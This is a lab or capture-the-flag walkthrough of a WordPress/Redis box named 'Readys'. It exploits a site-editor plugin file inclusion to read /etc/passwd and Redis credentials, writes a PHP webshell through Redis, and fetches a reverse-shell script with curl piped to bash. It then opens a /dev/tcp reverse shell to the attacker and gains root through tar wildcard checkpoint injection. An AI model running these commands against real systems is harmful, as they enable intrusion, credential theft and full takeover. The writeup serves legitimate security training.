## NMAP

```
sudo nmap -sC -sV -p- 192.168.68.166
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-28 08:40 CDT
Nmap scan report for 192.168.68.166
Host is up (0.042s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74ba2023899262029fe73d3b83d4d96c (RSA)
|   256 548f79555ab03a695ad5723964fd074e (ECDSA)
|_  256 7f5d102762ba75e9bcc84fe27287d4e2 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Readys &#8211; Just another WordPress site
|_http-generator: WordPress 5.7.2
|_http-server-header: Apache/2.4.38 (Debian)
6379/tcp open  redis   Redis key-value store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.94 seconds
```

## Enumeration

I have Redis but it requires auth and basic trial an error proves it is not default or the hostname.

I ran wp-scan and found that there is a plugin.

I have LFI on WP using an old plugin called site-editor:
```
http://192.168.68.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```
We have a user called alice with a home of /home/alice

I was able to find the redis configuration.
```
GET /wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/redis/redis.conf HTTP/1.1
```
requirepass Ready4Redis?
We have redis credentials

Now we need to utilize redis to write a shell to give us remote code execution or a reverse shell.

We can find the webroot by checking out **/etc/apache2/sites-enabled/000-default.conf**.
Looking at the config we see the default is /var/www/html. Attempting to write there we get an error.

Redis does allow limiting writing to certain folders. We can check the permissions on the service to determine them.
**/etc/systemd/system/redis.service**.

We find that we can write files to /etc/redis and /opt/redis-files. While attempting to write to /etc/redis, we come across an error that says redis is configured to save RDB snapshots. This does not allow us to save. 

Moving over to /opt/redis-files, we can write.

```sh
192.168.68.166:6379> config set dir /opt/redis-files
OK
192.168.68.166:6379> config set dbfilename redis.php
OK
192.168.68.166:6379> set test "<?php system($_GET['cmd']); ?>"
OK
192.168.68.166:6379> save
OK
192.168.68.166:6379> set test "<?php system('id'); ?>"
OK                                                                                                                  
192.168.68.166:6379> save
```

Ended up changing to ID as the command option failed. It showed that we were running as alice. We know we can run php from this directory and have it perform remote commands.

## Exploitation

I then created the following to run the command and connect back to my netcat instance.

```sh
config set dbfilename redis.php
OK
192.168.68.166:6379> config set dir /opt/redis-files
OK
set test "<?php system('curl 192.168.49.68/shell.sh | bash'); ?>"
OK
save
OK
```

Above we created a curl request that sends to bash.

I then started a python webshell to host the following shell:

```shell.sh
#!/bin/bash

/bin/bash -i >& /dev/tcp/192.168.49.68/9002 0>&1
```

```sh
nc -lvnp 9002
listening on [any] 9002 ...
connect to [192.168.49.68] from (UNKNOWN) [192.168.68.166] 46094
bash: cannot set terminal process group (541): Inappropriate ioctl for device
bash: no job control in this shell
<ite-editor/editor/extensions/pagebuilder/includes$ whoami
whoami
alice
<ite-editor/editor/extensions/pagebuilder/includes$ cd /home 
cd /home
alice@readys:/home$ ls
ls
alice
alice@readys:/home$ cd alice
cd alice
alice@readys:/home/alice$ ls
ls
local.txt
alice@readys:/home/alice$ ls -la
ls -la
total 24
drwxr-xr-x 2 alice alice 4096 Nov 12  2021 .
drwxr-xr-x 3 root  root  4096 Nov 12  2021 ..
lrwxrwxrwx 1 root  root     9 Nov 12  2021 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 alice alice 3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 alice alice  807 Apr 18  2019 .profile
-rw------- 1 alice alice   33 Mar 29 22:14 local.txt
alice@readys:/home/alice$ cat /etc/crontab
cat /etc/crontab                                                                                                    
*/3 * * * * root /usr/local/bin/backup.sh                                                                                                                                       
```
From here we find that there is a script that runs every 3 minutes. We can check out the backup script.
```  sh                                                            
alice@readys:/home/alice$ cat /usr/local/bin/backup.sh                                                              
cat /usr/local/bin/backup.sh                                                                                        
#!/bin/bash                                                                                                         
                                                                                                                    
cd /var/www/html                                                                                                    
if [ $(find . -type f -mmin -3 | wc -l) -gt 0 ]; then                                                               
tar -cf /opt/backups/website.tar *                                                                                  
fi                                                                                                                  
```
So it runs a tar command with a wildcard. Looking this up, there is a way to add additional commands to tar by creating files that act like commands. First we make sure we can write to the folder.
```sh
alice@readys:/home/alice$ ls -l /var/www                                                                            
ls -l /var/www                                                                                                      
total 4                                                                                                             
drwxr-xr-x 5 alice alice 4096 Mar 29 22:24 html
```

We can write to it. Lets start by creating the command file and then running touch to create a checkpoint to run the command to run the shell script.  https://www.gnu.org/software/tar/manual/html_section/checkpoints.html

``` sh
alice@readys:/home/alice$ cd /var/www/html                                                                          
cd /var/www/html                                                                                                    
alice@readys:/var/www/html$ echo "chmod +s /bin/bash" > exploit.sh                                                  
echo "chmod +s /bin/bash" > exploit.sh                                                                              
alice@readys:/var/www/html$ touch ./"--checkpoint=1"                                                                
touch ./"--checkpoint=1"                                                                                            
alice@readys:/var/www/html$ touch ./"--checkpoint-action=exec=bash exploit.sh"                                      
< touch ./"--checkpoint-action=exec=bash exploit.sh"                                                                
alice@readys:/var/www/html$ ls -l /bin/bash                                                                         
ls -l /bin/bash                                                                                                     
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash                                                               
alice@readys:/var/www/html$ /bin/bash -p                                                                            
/bin/bash -p                                                                                                        
whoami                                                                                                              
root                                                                                                                
cat /root/proof.txt 
```
We have root!